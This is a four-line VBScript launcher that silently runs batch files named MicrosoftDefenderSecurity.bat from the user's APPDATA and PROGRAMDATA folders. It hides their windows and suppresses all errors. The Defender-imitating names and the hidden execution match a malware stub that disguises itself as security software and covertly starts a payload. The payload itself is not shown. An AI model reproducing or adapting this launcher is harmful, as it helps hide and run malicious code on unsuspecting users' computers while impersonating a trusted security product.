On Error Resume Next
Set WshShell = WScript.CreateObject( "WScript.Shell" )
WshShell.Run "%APPDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.bat",0,True
WshShell.Run "%PROGRAMDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.bat",0,True
